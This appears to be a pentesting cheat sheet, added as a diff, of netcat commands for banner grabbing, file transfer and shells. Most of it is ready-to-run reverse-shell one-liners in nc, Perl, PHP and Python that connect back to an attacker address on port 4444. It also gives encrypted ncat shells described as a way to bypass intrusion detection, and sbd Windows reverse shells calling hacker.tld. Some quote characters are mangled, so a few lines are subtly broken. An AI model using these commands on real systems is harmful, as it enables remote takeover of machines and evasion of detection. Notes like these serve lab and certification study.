@@ -1,0 +1,43 @@
+Connection/banner grab
+nc -nv 192.168.100.100 21
+	-returns response headers
+nc -nvv -o bannerfile 192.168.1.1 22 < /home/user/workfiles/nudge
+
+HTTP server request
+nc -nv 192.168.100.100 80
+HEAD / HTTP/1.1
+	-request header will return a webserver's banner
+
+FILE TRANSFER
+nc -lvp 8080 > /root/Desktop/transfer.txt
+	-listen to recieve a file from remote host saved as filename.ext
+nc -v 192.168.100.107 8080 < /root/Desktop/transfer.txt
+	-sent a file to a remote host
+
+REVERSE/BIND shells
+	-set up such that nc on the attackbox is a listening instance and nc on the target is connecting/send instance passed the -e (exec after connection established option)
+ATTACKBOX: nc -lvp 4444
+TARGET: nc -v 192.168.1.11 4444 -e /bin/sh
+	Windows:
+	%windir%\system32\cmd.exe
+	%windir%\syswow64\WindowsPowerShell\v1.0\PowerShell_ISE.exe
+PERL REVERSE SHELL
+perl -e ‘use Socket;$i=”192.168.100.113?;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+PHP
+php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+PYTHON
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+
+
+ncat
+	-netcat reimplementation with encryption and authentication features, e.g. to bypass ids
+	ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
+	ncat -v 10.0.0.22 4444 --ssl
+		-encrypted reverse shell
+		
+sbd
+	sbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
+		-sbd windows reverse shell
+	./sbd -r1800 -q -e cmd.exe hacker.tld 993
+	
+	
